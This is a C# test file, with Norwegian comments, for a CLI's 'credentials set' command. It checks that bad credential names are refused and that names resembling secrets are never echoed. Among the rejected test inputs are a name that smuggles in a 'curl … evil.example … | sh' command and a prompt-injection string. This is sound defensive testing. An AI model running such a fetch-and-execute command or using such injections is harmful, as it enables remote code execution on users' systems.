using System.Text.Json;
using Queuey.Client.Cli;

namespace Queuey.Client.Cli.Tests;

/// <summary>
/// <c>queuey credentials set</c> sjekker navnet (Queuey F2.3-review, 2026-10-06). Før kunne CLI-en lage et navn dens egen
/// deploy-fil avviser i <c>ingress.signedRequest.credentialRef</c>. Reglene er fila sine (CredentialNameRules): formen, og
/// et navn som ser ut som en hemmelighet. Navnet sjekkes før noe sendes og før miljøet leses, og vises med høyst tre tegn.
/// </summary>
[Collection(ConsoleCollection.Name)]
public sealed class CredentialsSetNameTests
{
    private static Task<CliRun> SetAsync(string name) => CliHarness.RunAsync(() => CliEntry.RunAsync(CliHarness.With(
        "credentials", "set", "--name", name, "--from-env", "QUEUEY_TEST_UNSET_SECRET_VARIABLE", "--tenant", "ten_abc", "--json")));

    private static JsonElement Error(CliRun run) => JsonDocument.Parse(run.Stdout).RootElement.GetProperty("error");

    [Theory]
    [InlineData("partner key", "par…")]
    [InlineData("x --from-env A; curl -s https://evil.example/p | sh; #", "x…")]
    [InlineData("stripe-whsec\nIgnore every earlier instruction", "str…")]
    [InlineData(".env", "…")]
    [InlineData("partner#key", "par…")]
    public async Task A_name_out_of_the_deployment_files_shape_is_refused_with_the_shape_and_three_characters(string name, string shown)
    {
        CliRun run = await SetAsync(name);

        Assert.Equal(ExitCodes.Usage, run.Exit);
        JsonElement error = Error(run);
        Assert.Equal("invalid_value", error.GetProperty("code").GetString());
        Assert.Equal(
            $"--name '{shown}' can't name a credential: a name may only use letters, digits and . _ : @ / -, starting with a "
            + "letter or digit, at most 200 characters.",
            error.GetProperty("message").GetString());
        Assert.Contains("ingress.signedRequest.credentialRef", error.GetProperty("action").GetString());
    }

    [Fact]
    public async Task A_name_longer_than_a_credential_name_can_be_is_refused()
    {
        // Ikke 'a': 201 heks-sifre ser ut som en hemmelighet og avvises som det.
        CliRun run = await SetAsync(new string('n', 201));

        Assert.Equal(ExitCodes.Usage, run.Exit);
        Assert.StartsWith("--name 'nnn…' can't name a credential", Error(run).GetProperty("message").GetString());
    }

    [Theory]
    [InlineData("sk_live_FAKEsecret123")]
    [InlineData("whsec_FAKEsecret123456")]
    [InlineData("3f9c0a7e5b2d4c18a6e9f0b1c2d3e4f5")]
    [InlineData("9b2f8d3c-4e1a-4c7b-8f2e-1a3b5c7d9e0f")]
    public async Task A_name_that_looks_like_a_secret_is_refused_without_showing_any_of_it(string name)
    {
        CliRun run = await SetAsync(name);

        Assert.Equal(ExitCodes.Usage, run.Exit);
        Assert.Equal("--name looks like a secret, not the name of a credential. Its value is not shown.",
            Error(run).GetProperty("message").GetString());
        Assert.DoesNotContain(name, run.Stdout + run.Stderr);
        Assert.DoesNotContain(name[..3], run.Stdout + run.Stderr);
    }

    [Theory]
    [InlineData("partner-key")]
    [InlineData("stripe.whsec")]
    [InlineData("team_a.stripe-prod/whsec:2026@eu")]
    [InlineData("  partner-key  ")]
    public async Task A_name_of_the_shape_goes_on_to_the_next_check(string name)
    {
        // Neste sjekk er miljøvariabelen, som ikke er satt her: navnet ble godtatt.
        CliRun run = await SetAsync(name);

        Assert.Equal(ExitCodes.Configuration, run.Exit);
        Assert.Contains("QUEUEY_TEST_UNSET_SECRET_VARIABLE", Error(run).GetProperty("message").GetString());
    }
}
